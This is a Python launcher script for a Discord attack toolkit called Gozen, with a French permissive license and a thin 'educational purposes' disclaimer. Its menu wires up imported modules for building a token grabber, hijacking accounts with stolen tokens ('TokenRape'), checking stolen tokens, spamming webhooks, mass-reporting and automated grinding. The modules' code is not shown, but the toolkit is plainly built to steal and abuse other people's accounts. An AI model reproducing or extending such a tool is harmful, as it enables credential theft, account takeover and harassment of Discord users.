LICNECE = """
Copyright © 2021 𓇬| gozen#0666
L'autorisation est accordée par la présente, gratuitement, à toute personne obtenant une copie de ce logiciel et des fichiers de documentation associés (le "logiciel"), de traiter le logiciel sans restriction, y compris, sans s'y limiter, les droits d'utilisation, de copie, de modification, de fusion, de publication, de distribution, de sous-licence et/ou de vente de copies du logiciel, et d'autoriser les personnes à qui le logiciel est fourni à le faire, sous réserve des conditions suivantes :
L'avis de copyright ci-dessus et cet avis d'autorisation doivent être inclus dans toutes les copies ou parties substantielles du logiciel.
LE LOGICIEL EST FOURNI " EN L'ÉTAT ", SANS GARANTIE D'AUCUNE SORTE, EXPRESSE OU IMPLICITE, Y COMPRIS, MAIS SANS S'Y LIMITER, LES GARANTIES DE QUALITÉ MARCHANDE, D'ADÉQUATION À UN USAGE PARTICULIER ET DE NON-VIOLATION. EN AUCUN CAS, LES AUTEURS OU LES DÉTENTEURS DE DROITS D'AUTEUR NE POURRONT ÊTRE TENUS RESPONSABLES DE TOUTE RÉCLAMATION, DE TOUT DOMMAGE OU DE TOUTE AUTRE RESPONSABILITÉ, QUE CE SOIT DANS LE CADRE D'UNE ACTION CONTRACTUELLE, DÉLICTUELLE OU AUTRE, DÉCOULANT DE OU EN RELATION AVEC LE LOGICIEL OU L'UTILISATION OU TOUTE AUTRE TRANSACTION DU LOGICIEL.
"""

import time
import os

print(LICNECE)

time.sleep(3)
os.system('cls' if os.name == 'nt' else 'clear')

try:
    import time
    import os
    from colored import fg, bg, attr
    import modules.massReport as massReport
    import modules.credits as credits
    import modules.tokenGrabber as grabber
    import modules.tokenRape as tokenRape
    import modules.historyClear as historyClear
    import modules.tokenWebhookChecker as checkers
    import modules.webhookSpammer as spammer
    import modules.autoBump as bumper
    import modules.dankMemer as memer
    import modules.serverLookup as serverLookup
except ImportError as ex:
    input(f"Module {ex.name} not installed, to install run '{'python' if os.name == 'nt' else 'python3.8'} -m pip install {ex.name}'\nPress enter to exit")
    exit()


r = fg(241) # Setup color variables
r2 = fg(255)
b = fg(31)
w = fg(15)
y = fg(3) + attr(1)
d = r2 + attr(21)

class Client:
    def __init__(self):
        modules = {
            "1" : {"function" : grabber.create_grabber, "name" : "TokenGrabber"},
            "2" : {"function" : tokenRape.rape, "name" : "TokenRape"},
            "3" : {"function" : checkers.token, "name" : "TokenChecker"},
            "4" : {"function" : spammer.spammer, "name" : "WebhookSpammer"},
            "5" : {"function" : checkers.webhook, "name" : "WebhookChecker"},
            "6" : {"function" : bumper.bumper, "name" : "AutoBump"},
            "7" : {"function" : historyClear.clear, "name" : "HistoryClear"},
            "8" : {"function" : memer.start, "name" : "Dank memer grinder"},
            "9" : {"function" : serverLookup.fetch_data, "name" : "Server Lookup"},
            "10" : {"function" : massReport.start, "name" : "Mass Report"},
            "11" : {"function" : exit, "name" : "Exit"}
        }
        self.modules = modules

    def main(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f""" 
  /$$$$$$                                         
 /$$__  $$                                        
| $$  \__/  /$$$$$$  /$$$$$$$$  /$$$$$$  /$$$$$$$ 
| $$ /$$$$ /$$__  $$|____ /$$/ /$$__  $$| $$__  $$
| $$|_  $$| $$  \ $$   /$$$$/ | $$$$$$$$| $$  \ $$
| $$  \ $$| $$  | $$  /$$__/  | $$_____/| $$  | $$
|  $$$$$$/|  $$$$$$/ /$$$$$$$$|  $$$$$$$| $$  | $$
 \______/  \______/ |________/ \_______/|__/  |__/
                                                  
{r2} * DISCLAIMR : Ce script est fait pour *
 * à des fins éducatives et les développeurs *
 * n'assument aucune responsabilité et ne sont pas responsables *
 * pour toute mauvaise utilisation ou dommages causés par le *
 * script *
""")
        indx = 0
        for key, val in self.modules.items():
            num = f"{r2}[{b}{key}{r2}]"
            print(
                f" {num:<6} {val['name']:<{20 if int(key) < 10 else 19}}",
                end = "" if indx % 2 == 0 else "\n"
            )
            indx += 1


        if indx % 2 == 1:
            print("")

        option = input(f"\n {r2}[{b}?{r2}] Option: ")

        data = self.modules[option]

        data["function"]()

        input(f"\n {r2}[{b}!{r2}] Done! Press enter to continue")
        self.main()

if __name__ == '__main__':
    client = Client()
    client.main()
